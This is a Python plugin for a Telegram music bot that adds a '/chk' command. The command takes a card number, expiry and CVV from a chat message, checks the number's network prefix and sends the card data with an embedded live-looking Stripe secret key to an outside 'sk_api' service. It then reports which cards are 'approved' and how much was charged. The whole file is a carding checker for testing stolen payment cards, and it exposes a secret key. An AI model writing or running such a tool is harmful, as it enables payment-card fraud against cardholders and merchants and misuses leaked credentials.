from ANNIEMUSIC import app

import aiohttp
import asyncio
import re
from pyrogram import filters

CONCURRENCY_LIMIT = 1
semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

async def process_credit_card(cc_entry, message, stats, session):
    async with semaphore:
        try:
            x = re.findall(r'\d+', cc_entry)
            if len(x) != 4:
                return
            
            ccn, mm, yy, cvv = x

            VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
            if not ccn.startswith(VALID):
                return

            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "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"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    stats['declined'] += 1
                    return None
                elif r['status'] == 'approved':
                    stats['approved'] += 1
                    return {
                        'cc': f"{ccn}|{mm}|{yy}|{cvv}",
                        'charge': f"${r['payment_info']['amount']}",
                        'message': r.get('message', 'Approved')
                    }
        except Exception as e:
            return f"Error processing card: {e}\n"

async def format_output(approved_cards):
    if not approved_cards:
        return "No live cards."
    output = ""
    for card in approved_cards:
        output += f"⊗ 𝐆𝐚𝐭𝐞𝐬: Masstxt SK Base 1$ CVV\n⊗ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {card['cc']}\n"
        output += f"⊗ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {card['charge']}\n⊗ 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {card['message']}\n⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n\n"
    return output

@app.on_message(filters.command("chk", prefixes=[".", "/"]))
async def check_cc_entry(_, message):
    try:
        cc_entry = message.text.split(" ", 1)[1]
        stats = {'total': 1, 'approved': 0, 'declined': 0}
        async with aiohttp.ClientSession() as session:
            result = await process_credit_card(cc_entry.strip(), message, stats, session)
        
        if result:
            final_output = await format_output([result])
            summary = f"⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {message.from_user.username}\n{final_output}"
            await message.reply_text(summary)
        else:
            await message.reply_text("No live cards.")
    except Exception as e:
        await message.reply_text(f"Error processing CC entry: {e}")


